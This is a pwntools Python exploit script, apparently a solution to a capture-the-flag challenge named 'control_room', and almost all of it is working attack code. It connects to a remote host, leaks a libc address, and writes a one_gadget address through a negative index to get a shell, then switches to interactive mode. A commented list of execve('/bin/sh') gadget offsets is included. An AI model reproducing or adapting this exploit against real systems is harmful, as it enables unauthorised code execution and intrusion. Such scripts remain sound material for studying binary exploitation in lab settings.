#!/usr/bin/python3
from pwn import *
import time 

libc = ELF("./libc.so.6")
exe = './control_room'
elf = context.binary = ELF(exe)
# libc = ELF("")

def start(argv=[], *a, **kw):

    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

gdbscript = '''
    b* configure_engine
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

def calc(x):
    return -1 * int(abs((x-0x405120)/16))

# p = start()   
p = remote("138.68.158.112", 30342)
# dummy stuff
p.recvuntil(b"Enter a username: ")
p.send(b"A"*0x100)

# make captain
p.recvuntil(b"> ")
p.sendline(b"n")
p.recvuntil(b"size: ")
p.sendline(b"256")
p.sendline(b"")
time.sleep(1)
p.sendline(b"3")
for i in range(8):
    p.sendline(b"+")

p.sendline(b"y")
print(p.recvlines(30))
print(p.recvline())
p.sendline(b"4")
p.recvuntil(b"Latitude  : ")

hex(int(p.recvline().strip()) - 2924608)

p.recvuntil(b"Longitude : ")
libc = int(p.recvline().strip()) - 276052
print(libc)

p.sendline(b"5")
p.sendline(b"1")

p.recvuntil(b"Option [1-5]: ")
p.sendline(b"1")
p.sendline(b"-7")
p.sendline(f"{libc+0xebcf5}")
p.sendline(f"{libc+0xebcf5}")
p.sendline(b"y")
p.sendline(b"F")

'''
0x50a37 posix_spawn(rsp+0x1c, "/bin/sh", 0, rbp, rsp+0x60, environ)
constraints:
  rsp & 0xf == 0
  rcx == NULL
  rbp == NULL || (u16)[rbp] == NULL

0xebcf1 execve("/bin/sh", r10, [rbp-0x70])
constraints:
  address rbp-0x78 is writable
  [r10] == NULL || r10 == NULL
  [[rbp-0x70]] == NULL || [rbp-0x70] == NULL

0xebcf5 execve("/bin/sh", r10, rdx)
constraints:
  address rbp-0x78 is writable
  [r10] == NULL || r10 == NULL
  [rdx] == NULL || rdx == NULL

0xebcf8 execve("/bin/sh", rsi, rdx)
constraints:
  address rbp-0x78 is writable
  [rsi] == NULL || rsi == NULL
  [rdx] == NULL || rdx == NULL
'''

p.interactive()